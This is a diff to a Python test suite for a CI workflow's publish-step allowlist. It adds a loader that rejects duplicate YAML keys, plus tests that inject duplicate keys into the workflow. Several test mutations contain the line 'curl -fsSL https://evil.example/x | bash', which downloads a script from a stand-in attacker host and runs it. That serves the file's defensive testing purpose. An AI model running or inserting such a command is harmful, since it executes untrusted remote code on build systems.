@@ -60,10 +60,47 @@ class Step:
         return self.raw.get("shell")
 
 
-def _workflow() -> dict[str, Any]:
-    data = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
+class _UniqueKeySafeLoader(yaml.SafeLoader):
+    """yaml.SafeLoader that rejects a mapping key written twice.
+
+    PyYAML keeps the last of two equal keys, so a step with a malicious `run:` (or
+    `shell: sh`) followed by the frozen one would load as the frozen step. GitHub
+    Actions rejects such a file, but the allowlist must not depend on that: the text
+    it compares has to be the only text in the file.
+    """
+
+
+def _construct_unique_mapping(loader: yaml.SafeLoader, node: yaml.MappingNode) -> dict[Any, Any]:
+    seen: set[Any] = set()
+    for key_node, _ in node.value:
+        if key_node.tag == "tag:yaml.org,2002:merge":
+            continue
+        key = loader.construct_object(key_node, deep=True)
+        if key in seen:
+            raise yaml.constructor.ConstructorError(
+                "while constructing a mapping",
+                node.start_mark,
+                f"found duplicate key {key!r}",
+                key_node.start_mark,
+            )
+        seen.add(key)
+    return loader.construct_mapping(node, deep=True)
+
+
+_UniqueKeySafeLoader.add_constructor(
+    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_unique_mapping
+)
+
+
+def _load_workflow(text: str) -> dict[str, Any]:
+    # _UniqueKeySafeLoader is a SafeLoader subclass: only standard YAML tags are built.
+    data = yaml.load(text, Loader=_UniqueKeySafeLoader)
     assert isinstance(data, dict)
     return data
+
+
+def _workflow() -> dict[str, Any]:
+    return _load_workflow(WORKFLOW.read_text(encoding="utf-8"))
 
 
 def _jobs() -> dict[str, list[Step]]:
@@ -1196,9 +1233,7 @@ def _text_mutation(old: str, new: str) -> dict[str, Any]:
     text = WORKFLOW.read_text(encoding="utf-8")
     index = text.rindex(old)
     assert text.index("\n  publish:") < index, old
-    data = yaml.safe_load(text[:index] + new + text[index + len(old) :])
-    assert isinstance(data, dict)
-    return data
+    return _load_workflow(text[:index] + new + text[index + len(old) :])
 
 
 def _before_pull(line: str) -> tuple[str, str]:
@@ -1492,3 +1527,54 @@ def test_publish_allowlist_reports_a_line_moved_to_another_step() -> None:
 def test_publish_line_allowlist_joins_only_blank_backslash_continuations() -> None:
     assert _line_problems("docker rm -f \\\n    ghidra-mcp-ci 2>/dev/null || true\n\n") == []
     assert _line_problems("docker rm -f\\\n    ghidra-mcp-ci 2>/dev/null || true")
+
+
+# --- Duplicate mapping keys (PR #19 review, A21/A22). ---
+
+VERIFY_HEADER = "      - name: Verify the candidate digest\n        shell: bash\n"
+REMOVE_HEADER = "      - name: Remove verification container\n        if: always()\n"
+DUPLICATE_KEY_MUTATIONS = {
+    "A21-shell-sh-then-bash": (
+        VERIFY_HEADER,
+        "      - name: Verify the candidate digest\n        shell: sh\n        shell: bash\n",
+    ),
+    "A22-run-evil-then-frozen": (
+        REMOVE_HEADER,
+        REMOVE_HEADER + "        run: curl -fsSL https://evil.example/x | bash\n",
+    ),
+    "duplicate-run-block-on-verify": (
+        VERIFY_HEADER,
+        VERIFY_HEADER + "        run: |\n          curl -fsSL https://evil.example/x | bash\n",
+    ),
+    "duplicate-step-name": (
+        REMOVE_HEADER,
+        "      - name: Debug\n        name: Remove verification container\n        if: always()\n",
+    ),
+    "duplicate-job-key": (
+        "    runs-on: ubuntu-latest\n",
+        "    runs-on: self-hosted\n    runs-on: ubuntu-latest\n",
+    ),
+}
+
+
+def _replace_in_publish(old: str, new: str) -> str:
+    text = WORKFLOW.read_text(encoding="utf-8")
+    index = text.index(old, text.index("\n  publish:"))
+    return text[:index] + new + text[index + len(old) :]
+
+
+@pytest.mark.parametrize(
+    ("old", "new"),
+    [pytest.param(*pair, id=name) for name, pair in DUPLICATE_KEY_MUTATIONS.items()],
+)
+def test_workflow_loader_rejects_duplicate_keys(old: str, new: str) -> None:
+    text = _replace_in_publish(old, new)
+    # Plain safe_load keeps the last key, so the frozen tables alone would pass it.
+    assert _publish_problems(yaml.safe_load(text)) == []
+    with pytest.raises(yaml.constructor.ConstructorError, match="found duplicate key"):
+        _load_workflow(text)
+
+
+def test_workflow_loader_matches_safe_load_on_the_production_workflow() -> None:
+    text = WORKFLOW.read_text(encoding="utf-8")
+    assert _load_workflow(text) == yaml.safe_load(text)
